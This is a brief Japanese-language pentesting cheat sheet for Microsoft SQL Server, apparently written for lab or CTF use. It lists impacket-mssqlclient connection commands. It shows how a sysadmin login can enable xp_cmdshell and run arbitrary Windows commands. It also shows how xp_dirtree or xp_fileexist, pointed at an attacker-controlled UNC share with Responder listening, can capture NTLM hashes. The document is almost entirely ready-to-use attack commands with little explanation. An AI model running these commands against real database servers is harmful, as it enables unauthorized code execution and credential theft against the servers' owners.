# Microsoft SQL Serverとは
マイクロソフトが開発したRDBMS

## ポート
1433

## impacket-mssqlclientを使用した接続
```bash
impacket-mssqlclient <ユーザー名>@<ターゲット> -windows-auth # -windows-authが不要な場合あり
impacket-mssqlclient <ユーザー名>:<パスワード>@<ターゲット> -windows-auth # -windows-authが不要な場合あり
impacket-mssqlclient -k <FQDN> # Kerberos認証
```

## sysadminの悪用
システム全体に対する最高レベルの権限を持つ固定サーバーロールであるため、sysadminであればRCEが可能。
```bash
SELECT IS_SRVROLEMEMBER('sysadmin') # 1であればsysadmin
# 以下シェル操作を有効にする手順
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell '<任意のWindowsコマンド>';
```

## xp_dirtree, xp_fileexistの悪用
管理者権限がなくとも、UNCパスを扱う`xp_dirtree`, `xp_fileexist`を使用することでNTLMハッシュの取得が可能。
```bash
# kali
sudo responder -I tun0
# mssql
EXEC xp_dirtree '\\<YOUR IP>\<Share>'
EXEC xp_fileexist '\\<YOUR IP>\<Share>'
```
